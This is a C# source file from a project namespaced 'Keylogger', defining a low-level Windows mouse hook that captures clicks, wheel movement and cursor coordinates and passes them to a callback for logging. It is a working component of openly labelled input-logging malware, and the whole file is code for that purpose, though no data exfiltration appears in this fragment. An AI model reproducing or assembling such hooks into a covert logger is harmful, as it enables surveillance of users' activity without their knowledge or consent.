using System.Runtime.InteropServices;
using static Keylogger.Interop.Win32Api;
using static Keylogger.Interop.Win32ApiHelper;

namespace Keylogger.Hooks
{
    internal static class MouseHook
    {
        public static Hookproc Hookproc => MouseHookCallback;

        public static Action<string, string>? CallBackMethod;

        private static IntPtr MouseHookCallback(int code, UIntPtr wParam, IntPtr lParam)
        {
            if (code >= 0)
            {
                var mouseStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
                var position = $"(x:{mouseStruct.pt.x}, y:{mouseStruct.pt.y})";

                if ((MouseMessage)wParam == MouseMessage.WM_MOUSEWHEEL)
                {
                    var wheelDelta = (short)((mouseStruct.mouseData >> 16) & 0xffff);
                    var wheelDirection = wheelDelta > 0 ? "[WHEEL FORWARD]" : "[WHEEL BACKWARD]";
                    CallBackMethod?.Invoke(wheelDirection, position);
                }
                else
                {
                    CallBackMethod?.Invoke($"[{GetMouseMessageName(wParam)}]", position);
                }
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}